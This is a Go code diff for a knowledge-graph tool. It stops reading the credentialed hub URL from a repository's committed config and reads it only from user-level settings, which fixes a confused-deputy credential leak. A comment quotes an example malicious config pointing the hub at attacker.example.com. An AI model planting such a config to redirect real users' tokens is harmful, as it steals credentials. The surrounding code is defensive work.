@@ -305,11 +305,113 @@ func GetDefaultScope(aiDir string) (string, error) {
 	return config.DefaultScope, nil
 }
 
-// GetHubURL reads the shared knowledge hub URL from .ai/config.json ("hub" key).
-// Returns empty string if no hub is configured.
+// Hub URL resolution.
+//
+// The hub URL is deliberately NOT taken from the repository being indexed.
+//
+// It used to be: GetHubURL read `.ai/config.json` out of the checkout, and
+// OpenFederatedStore then handed that URL to remote.NewLayer along with
+// KG_HUB_READ_TOKEN from the user's environment, which the layer sends as an
+// Authorization: Bearer header. Scope configs are meant to be committed and
+// shared, so a repository could ship
+//
+//	{"hub": "https://attacker.example.com"}
+//
+// and any `kg search` — or any agent's search_knowledge call — in that checkout
+// would send the query text and the user's hub credential to a host the
+// repository chose. That is a confused deputy: ambient authority aimed by
+// untrusted data. It fails silently too, because it does not fail — it succeeds
+// against the wrong host.
+//
+// So the destination is the user's decision and the repository's is not. A repo
+// may still say which *graphs* it wants federated, via a scope's `remotes`;
+// naming graphs on a hub the user already trusts carries no authority.
+
+// hubURLEnv overrides the configured hub for one invocation.
+const hubURLEnv = "KG_HUB_URL"
+
+// UserConfigPath returns the user-level kg config file. Honours KG_HOME the
+// same way the personal store does (see personalDir in the kg package, which
+// resolves the same base directory for the store itself).
+func UserConfigPath() (string, error) {
+	if dir := os.Getenv("KG_HOME"); dir != "" {
+		return filepath.Join(dir, "config.json"), nil
+	}
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return "", fmt.Errorf("determine home directory (set KG_HOME to override): %w", err)
+	}
+	return filepath.Join(home, ".kg", "config.json"), nil
+}
+
+// GetHubURL returns the hub this user has chosen to trust, or "" if none.
+//
+// aiDir is still accepted so callers can be told when a repository names a hub
+// that is being ignored — see RepoSuggestedHubURL. It is never a source of the
+// URL itself.
 func GetHubURL(aiDir string) (string, error) {
-	configPath := filepath.Join(aiDir, "config.json")
-	data, err := os.ReadFile(configPath)
+	if url := strings.TrimSpace(os.Getenv(hubURLEnv)); url != "" {
+		return url, nil
+	}
+
+	path, err := UserConfigPath()
+	if err != nil {
+		return "", err
+	}
+	url, err := readHubKey(path)
+	if err != nil {
+		return "", err
+	}
+	return strings.TrimSpace(url), nil
+}
+
+// RepoSuggestedHubURL returns the hub a repository names in .ai/config.json.
+//
+// Returned for reporting only — so a command can tell the user "this project
+// expects hub X; trust it with `kg config set-hub X`" and leave the decision
+// with them. Never pass this to anything that will send a credential to it.
+func RepoSuggestedHubURL(aiDir string) string {
+	url, err := readHubKey(filepath.Join(aiDir, "config.json"))
+	if err != nil {
+		return ""
+	}
+	return strings.TrimSpace(url)
+}
+
+// SetUserHubURL records the hub this user trusts, creating the config if needed.
+func SetUserHubURL(hubURL string) (string, error) {
+	path, err := UserConfigPath()
+	if err != nil {
+		return "", err
+	}
+	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
+		return "", fmt.Errorf("create config directory: %w", err)
+	}
+
+	config := map[string]any{}
+	if data, err := os.ReadFile(path); err == nil {
+		if err := json.Unmarshal(data, &config); err != nil {
+			return "", fmt.Errorf("parse %s: %w", path, err)
+		}
+	} else if !os.IsNotExist(err) {
+		return "", fmt.Errorf("read %s: %w", path, err)
+	}
+
+	config["hub"] = hubURL
+	data, err := json.MarshalIndent(config, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("encode config: %w", err)
+	}
+	if err := os.WriteFile(path, append(data, '\n'), 0600); err != nil {
+		return "", fmt.Errorf("write %s: %w", path, err)
+	}
+	return path, nil
+}
+
+// readHubKey reads the "hub" key from a config file, treating a missing file as
+// no hub rather than an error.
+func readHubKey(path string) (string, error) {
+	data, err := os.ReadFile(path)
 	if os.IsNotExist(err) {
 		return "", nil
 	}
@@ -321,9 +423,8 @@ func GetHubURL(aiDir string) (string, error) {
 		Hub string `json:"hub"`
 	}
 	if err := json.Unmarshal(data, &config); err != nil {
-		return "", fmt.Errorf("parse config: %w", err)
+		return "", fmt.Errorf("parse config %s: %w", path, err)
 	}
-
 	return config.Hub, nil
 }
 
